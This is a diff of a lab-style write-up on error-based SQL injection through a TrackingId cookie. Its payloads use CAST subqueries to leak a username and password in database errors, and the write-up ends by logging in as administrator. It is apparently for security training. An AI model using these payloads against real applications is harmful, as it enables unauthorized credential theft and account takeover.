@@ -8,12 +8,12 @@ The database contains a table called users with columns named usernames and pass
 *****Checking if SQLi vulnerability exists
 
 ATTEMPT-1
-Input: TrackingId=7ibJBp67n6rRappt'
-Output: Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'PkNvNfhGfSVcwSBY''. Expected  char
+⦁ Input: TrackingId=7ibJBp67n6rRappt'
+⦁ Output: Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'PkNvNfhGfSVcwSBY''. Expected  char
 
 ATTEMPT-2
-Input: TrackingId=7ibJBp67n6rRappt'--
-Output: Ok
+⦁ Input: TrackingId=7ibJBp67n6rRappt'--
+⦁ Output: Ok
 
 Lesson Learned: The error displayed the entire SQL query, hence error-based SQLi can be performed
 
@@ -22,52 +22,53 @@ Note: If conditional errors(CASE WHEN (1=1) THEN TO_CHAR(1/0)) can't be triggere
 *****Checking if a subquery can be injected and executed*****
 
 ATTEMPT-1
-Input: TrackingId=7ibJBp67n6rRappt' AND CAST((SELECT 1)AS int)--; 
-Output: ERROR: argument of AND must be type boolean, not type integer Position: 63
-Lesson Learned: The query needs to be of Boolean type
+⦁ Input: TrackingId=7ibJBp67n6rRappt' AND CAST((SELECT 1)AS int)--; 
+⦁ Output: ERROR: argument of AND must be type boolean, not type integer Position: 63
+⦁ Lesson Learned: The query needs to be of Boolean type
 
 ATTEMPT-2
-Input: TrackingId=7ibJBp67n6rRappt' AND 1=CAST((SELECT 1)AS int)--;
-Output: 1
+⦁ Input: TrackingId=7ibJBp67n6rRappt' AND 1=CAST((SELECT 1)AS int)--;
+⦁ Output: 1
 
 Lesson Learned: Reading the error messages helps us to modify the query accordingly
 
 *****Checking whether users table exists*****
 
 ATTEMPT-1
-Input: TrackingId=7ibJBp67n6rRappt' AND 1=CAST((SELECT username FROM users)AS int)--
-Output: Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'PkNvNfhGfSVcwSBY' AND 1=CAST((SELECT username FROM users)AS '. Expected  char
-Lesson Learned: Character limit exists
+⦁ Input: TrackingId=7ibJBp67n6rRappt' AND 1=CAST((SELECT username FROM users)AS int)--
+⦁ Output: Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'PkNvNfhGfSVcwSBY' AND 1=CAST((SELECT username FROM users)AS '. Expected  char
+⦁ Lesson Learned: Character limit exists
 
 ATTEMPT-2
-Input: ' AND 1=CAST((SELECT username FROM users)AS int)--
-Output: ERROR: more than one row returned by a subquery used as an expression
-Lesson Learned: Need to limit results returned by the subquery to 1
+⦁ Input: ' AND 1=CAST((SELECT username FROM users)AS int)--
+⦁ Output: ERROR: more than one row returned by a subquery used as an expression
+⦁ Lesson Learned: Need to limit results returned by the subquery to 1
 
 ATTEMPT-3
-Input: ' AND 1=CAST((SELECT username FROM users LIMIT 1)AS int)--
-Output: ERROR: invalid input syntax for type integer: "administrator"
+⦁ Input: ' AND 1=CAST((SELECT username FROM users LIMIT 1)AS int)--
+⦁ Output: ERROR: invalid input syntax for type integer: "administrator"
+
 Lesson Learned: A user called administrator exists in users table
 
 *****Finding the password for administrator user*****
 
 ATTEMPT-1
-Input: ' AND 1=CAST((SELECT password FROM users WHERE username = 'administrator' LIMIT 1)AS int)--
-Output: Syntax error at line 97
-Lesson Learned: Only change what is required in the previous query, don't modify entire query
+⦁ Input: ' AND 1=CAST((SELECT password FROM users WHERE username = 'administrator' LIMIT 1)AS int)--
+⦁ Output: Syntax error at line 97
+⦁ Lesson Learned: Only change what is required in the previous query, don't modify entire query
 
 ATTEMPT-2
-Input: ' AND 1=CAST((SELECT password FROM users LIMIT 1)AS int)--; 
-Output: ERROR: invalid input syntax for type integer: "5ggqezgt6niqoxq84i5d"
+⦁ Input: ' AND 1=CAST((SELECT password FROM users LIMIT 1)AS int)--; 
+⦁ Output: ERROR: invalid input syntax for type integer: "5ggqezgt6niqoxq84i5d"
 
 Lesson Learned: The error discloses the password
 
 *****Obtaining escalated privileges by logging into the admin account******
 
 ATTEMPT-1
-Input: Username: administrator
-          Password: 5ggqezgt6niqoxq84i5d
-Output: Welcome administrator
+⦁ Input: Username: administrator
+         Password: 5ggqezgt6niqoxq84i5d
+⦁ Output: Welcome administrator
 
 Lesson Learned: Sensitive account credentials can be used for privilege escalation
 
